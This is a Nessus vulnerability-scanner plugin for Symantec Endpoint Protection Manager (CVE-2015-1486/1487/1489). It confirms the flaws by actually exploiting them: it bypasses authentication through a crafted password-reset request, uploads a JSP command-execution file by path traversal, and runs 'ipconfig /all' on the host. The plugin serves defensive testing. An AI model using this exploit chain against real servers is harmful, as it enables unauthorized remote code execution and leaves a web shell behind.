#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(85351);
  script_version("1.14");
  script_set_attribute(attribute:"plugin_modification_date", value:"2024/06/05");

  script_cve_id("CVE-2015-1486", "CVE-2015-1487", "CVE-2015-1489");
  script_bugtraq_id(76074, 76078, 76094);

  script_name(english:"Symantec Endpoint Protection Manager < 12.1 RU6 MP1 Multiple Vulnerabilities (SYM15-007)");

  script_set_attribute(attribute:"synopsis", value:
"An application running on the remote host is affected by multiple
vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"The version of Symantec Endpoint Protection Manager (SEPM) running
on the remote host is prior to 12.1 RU6 MP1. It is, therefore,
affected by the following vulnerabilities :

  - A flaw exists in the password reset functionality that
    allows a remote attacker, using a crafted password reset
    action, to generate a new administrative session, thus
    bypassing authentication. (CVE-2015-1486)

  - A flaw exists related to filename validation in a
    console session that allows an authenticated, remote
    attacker to write arbitrary files. (CVE-2015-1487)

  - An unspecified flaw exists that allows an authenticated,
    remote attacker to manipulate SEPM services and gain
    elevated privileges. (CVE-2015-1489)

Nessus attempts to use the authentication bypass flaw in conjunction
with the arbitrary file upload and path traversal flaws to test the
issue on the remote server. If this test succeeds, it is likely that
the application is also affected by other vulnerabilities, including
a SQL Injection.");
  # https://codewhitesec.blogspot.com/2015/07/symantec-endpoint-protection.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?135bc3c2");
  # https://support.symantec.com/en_US/article.SYMSA1330.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?647383e8");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Symantec Endpoint Protection Manager 12.1 RU6 MP1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:S/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Symantec Endpoint Protection Manager File Upload");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Symantec Endpoint Protection Manager Authentication Bypass and Code Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/07/30");
  script_set_attribute(attribute:"patch_publication_date", value:"2015/07/30");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/08/13");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:symantec:endpoint_protection_manager");
  script_set_attribute(attribute:"enable_cgi_scanning", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015-2024 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("symantec_endpoint_prot_mgr_detect.nasl");
  script_require_keys("installed_sw/sep_mgr");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 9090);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = 'Symantec Endpoint Protection Manager';
get_install_count(app_name:"sep_mgr", exit_if_zero:TRUE); # Stops port branching

port = get_http_port(default:9090);

install = get_single_install(app_name:"sep_mgr", port:port);

url = build_url(port:port, qs:install["dir"]);
req = make_list();


# The first request takes a bit longer than most requests
http_set_read_timeout(30);
# First we make the request to reset the password
item ="/servlet/ConsoleServlet?ActionType=ResetPassword&UserID=admin&Domain=";
res  = http_send_recv3(
  port         : port,
  method       : "POST",
  item         : item,
  exit_on_fail : TRUE
);
# Bail out for unexpected response
if("200 OK" >!< res[0] || "Server: SEPM" >!< res[1])
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, url);
req[0] = http_last_sent_request();

time = unixtime();
file = "nessus_"+SCRIPT_NAME - ".nasl" + '-' + time + '.jsp';
dat  = '<%=new java.util.Scanner(Runtime.getRuntime().exec("ipconfig /all").getInputStream()).useDelimiter("\\\\A").next()%>';
item = "/servlet/ConsoleServlet?ActionType=BinaryFile&KnownHosts=.&Action=UploadPackage&PackageFile=../../../tomcat/webapps/ROOT/"+file;
res  = http_send_recv3(
  port         : port,
  method       : "POST",
  item         : item,
  data         : dat,
  exit_on_fail : TRUE
);
# Bail out for unexpected response
if("200 OK" >!< res[0] || "Server: SEPM" >!< res[1])
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, url);
req[1] = http_last_sent_request();

res = http_send_recv3(
  port         : port,
  method       : "GET",
  item         : "/"+file,
  exit_on_fail : TRUE
);
req[2] = http_last_sent_request();
# Bail out for unexpected response
if("200 OK" >!< res[0] || "Server: SEPM" >!< res[1])
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, url);
output = chomp(res[0]+res[1]+res[2]);

# Final check to make sure we were able to exploit
if("200 OK" >!< output ||  "Subnet Mask" >!< output)
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, url);

security_report_v4(
  port         : port,
  request      : req,
  output       : output,
  severity     : SECURITY_HOLE,
  rep_extra    : "Note: This file has not been removed by Nessus and will need to be manually deleted ("+file+")",
  cmd          : "ipconfig /all"
);
